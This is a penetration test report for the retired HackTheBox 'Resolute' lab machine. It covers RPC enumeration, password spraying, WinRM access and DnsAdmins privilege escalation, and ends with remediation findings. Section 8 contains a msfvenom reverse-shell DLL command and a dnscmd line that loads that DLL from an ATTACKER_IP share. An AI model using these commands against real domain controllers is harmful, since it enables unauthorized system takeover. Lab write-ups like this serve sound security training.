# HTB Resolute - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-11

---

## 0. Lesson Learned

When doing manual enumeration on Windows, you should always use `dir -force` in PowerShell (or `/a` in cmd) when checking important directories like `C:\`.

---

## 1. Executive Summary

A penetration test was conducted against the target host Resolute.megabank.local, a Windows Server 2016 Domain Controller within the megabank.local Active Directory environment. The objective was to identify vulnerabilities that could allow an attacker to gain unauthorized access and escalate privileges to domain administrator level.

Initial reconnaissance revealed several Active Directory services including SMB, LDAP, Kerberos, and WinRM. Anonymous RPC enumeration allowed extraction of domain user information, which exposed credentials embedded within user account descriptions. Credential spraying identified valid credentials for the user melanie, enabling remote command execution through WinRM.

Post-exploitation enumeration revealed a PowerShell transcript log containing additional credentials for the user ryan. The ryan account belonged to the DnsAdmins group, which allowed exploitation of the DNS Server Plugin functionality to load a malicious DLL. This technique enabled execution of arbitrary code as NT AUTHORITY\SYSTEM, resulting in full system compromise.

The assessment demonstrates that improper credential management and excessive privileges assigned to the DnsAdmins group can lead to complete domain compromise.

---

## 2. Scope

- **Target:** 10.129.96.155
- **Domain:** megabank.local
- **Environment:** HackTheBox Resolute (Retired Machine)
- **Testing Window:** 2026-3-10
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.96.155 -T4 -oA resolute_tcp
```

Key services identified:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139,445/tcp - SMB
- 389/tcp - LDAP
- 464/tcp - Kpasswd
- 593/tcp - RPC
- 5985/tcp - WinRM
- 3268,3269/tcp - Global Catalog

The host was identified as Windows Server 2016 within the megabank.local Active Directory domain.

---

## 5. Enumeration

Anonymous SMB authentication was possible, although shares were not accessible:

```
smbclient -L //10.129.96.155 -N
```

RPC enumeration was performed using a null session:

```
rpcclient -U "" -N 10.129.96.155
```

Domain users and groups were successfully enumerated:

```
enumdomusers

enumdomgroups
```

During user enumeration, the description field of user accounts was inspected:

```
queryuser 0x457
```

The following credentials wer discovered embedded in the user description:

```
marko : Welcome123!
```

---

## 6. Initial Access

The discovered password was tested against all domain users using password spraying:

```
crackmapexec winrm 10.129.96.155 -u usernames.txt -p 'Welcome123!'
```

Valid credentials were discovered for:

```
melanie : Welcome123!
```

Remote access was obtained through WinRM:

```
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
```

This provided a PowerShell session on the target system.

---

## 7. Post-Exploitation

After obtaining a shell as melanie, additional enumeration was performed:

```
whoami

whoami /priv

whoami /groups
```

File system exploration revealed a PowerShell transcripts directory on the root drive:

```
cd C:\

dir -force
```

A folder named PSTranscripts was identified:

```
cd C:\PSTranscripts
```

Inside the directory, a Powershell transcript file was discovered:

```
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

The transcript contained administrative command history including credentials:

```
ryan : Serv3r4Admin4cc123!
```

---

## 8. Privilege Escalation

Using the newly discovered credentials, access was obtained as ryan:

```
evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
```

Group membership enumeration revealed this account belongs to DnsAdmins:

```
whoami /groups
```

Members of the DnsAdmins group can configure the DNS server plugin DLL.

A malicious DLL payload was generated:

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll > privesc.dll
```

An SMB share was created to host the DLL:

```
sudo impacket-smbserver share $(pwd)
```

The DNS server was configured to load the malicious plugin:

```
dnscmd Resolute.megabank.local /config /serverlevelplugindll \\ATTACKER_IP\share\privesc.dll
```

The DNS service was restarted:

```
sc.exe stop dns

sc.exe start dns
```

Upon service restart, the DLL executed and initiated a reverse shell:

```
nc -lnvp 443
```

The shell ran as NT AUTHORITY\SYSTEM.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\melanie\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Plaintext Password Stored in LDAP Attribute

**Severity:** Critical

**Description:**
A domain user password was stored in plaintext within an Active Directory attribute (such as the description field), making it accessible to authenticated users.

**Impact:**
Attackers could retrieve the exposed credential and use it to authenticate as the affected user, potentially leading to privilege escalation or lateral movement.

**Recommendation:**
Prohibit storage of credentials in Active Directory attributes, implement auditing for sensitive attribute exposure, and perform credential rotation for affected accounts.

### **Finding:** PowerShell Transcripts Containing Credentials

**Severity:** High

**Description:**
PowerShell transcript logs contained administrative commands with plaintext credentials.

**Impact:**
Attackers with access to the transcript logs could retrieve credentials and potentially escalate privileges or move laterally within the environment.

**Recommendation:**
Avoid executing commands containing plaintext credentials, restrict access to PowerShell transcript logs, and implement secure credential storage mechanisms.

### **Finding:** Privileged DNSAdmins Group Abuse

**Severity:** Critical

**Description:**
Membership in the DNSAdmins group allowed modification of DNS server configuration, enabling attackers to load arbitrary DLLs into the DNS service.

**Impact:**
Attackers could execute malicious code as SYSTEM on the domain controller, leading to full domain compromise.

**Recommendation:**
Limit membership of the DNSAdmins group to authorized administrators, monitor DNS server configuration changes, and implement application whitelisting to prevent unauthorized DLL execution.

---

## 11. Appendix


DnsAdmins Privilege Escalation Resource 1 - [https://infosecwriteups.com/dnsadmins-privesc-0df5ef7e2f61](https://infosecwriteups.com/dnsadmins-privesc-0df5ef7e2f61)
DnsAdmins Privilege Escalation Resource 2 - [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
DnsAdmins Privilege Escalation Resource 3 - [https://github.com/sachinn403/PentestCodeX/blob/main/pentesting/06-privesc/windows/group-privileges/dnsadmins.md](https://github.com/sachinn403/PentestCodeX/blob/main/pentesting/06-privesc/windows/group-privileges/dnsadmins.md)